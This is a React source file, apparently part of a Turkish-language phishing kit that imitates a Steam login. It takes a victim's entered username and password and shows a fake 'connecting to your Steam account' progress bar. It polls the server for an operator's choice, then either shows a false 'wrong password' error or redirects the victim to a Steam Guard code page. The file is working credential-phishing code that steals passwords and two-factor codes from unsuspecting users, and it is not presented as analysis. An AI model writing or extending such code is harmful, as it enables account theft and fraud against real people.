
import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { Loader } from 'lucide-react';
import { toast } from 'sonner';
import { Progress } from '@/components/ui/progress';

const LoadingPage = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [progress, setProgress] = useState(0);
  const credentials = location.state || { username: '', password: '', id: null };

  console.log("Loading page initialized with credentials:", credentials);

  // Handle offline status when user leaves the page
  useEffect(() => {
    if (credentials.id) {
      // Set up cleanup function to mark user as offline when leaving
      return () => {
        fetch('/api/set-user-offline', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ userId: credentials.id }),
        }).catch(err => {
          console.error("Error setting user offline:", err);
        });
      };
    }
  }, [credentials.id]);

  // Set up polling to listen for admin commands
  useEffect(() => {
    // For the demo, we'll use polling
    const checkAdminActions = setInterval(() => {
      // Skip if no username is available
      if (!credentials.username) return;
      
      // Mock API fetch to check for admin actions
      fetch('/api/check-admin-action?username=' + credentials.username)
        .then(res => res.json())
        .then(data => {
          console.log("Admin action check response:", data);
          if (data.action === 'retry') {
            // Admin clicked "Retry"
            clearInterval(checkAdminActions);
            toast.error("Hesap adı veya parola yanlış");
            setTimeout(() => navigate('/'), 2000);
          } else if (data.action === 'steam-guard') {
            // Admin clicked "Ask for Steam Guard"
            clearInterval(checkAdminActions);
            navigate('/steam-guard', { state: { username: credentials.username } });
          }
        })
        .catch(err => {
          console.error("Error checking admin actions:", err);
        });
    }, 3000); // Check every 3 seconds

    // Simulate progress bar
    const progressInterval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 95) {
          return 95; // Keep at 95% until action is taken
        }
        return prev + 5;
      });
    }, 1000);

    return () => {
      clearInterval(checkAdminActions);
      clearInterval(progressInterval);
    };
  }, [credentials, navigate]);

  return (
    <div className="min-h-screen bg-[#171a21] flex flex-col items-center justify-center p-4">
      <div className="bg-[#1b2838]/70 backdrop-blur-sm p-8 rounded-md shadow-lg max-w-md w-full text-center">
        <Loader className="animate-spin h-12 w-12 text-blue-400 mx-auto mb-4" />
        <h1 className="text-xl font-bold text-white mb-2">Giriş Yapılıyor</h1>
        <p className="text-white/70 mb-6">Steam hesabınıza bağlanılıyor, lütfen bekleyin...</p>
        
        <div className="w-full mb-6">
          <Progress value={progress} className="h-2 bg-[#32353c]" />
          <p className="text-xs text-white/50 mt-1 text-right">{progress}%</p>
        </div>
      </div>
    </div>
  );
};

export default LoadingPage;
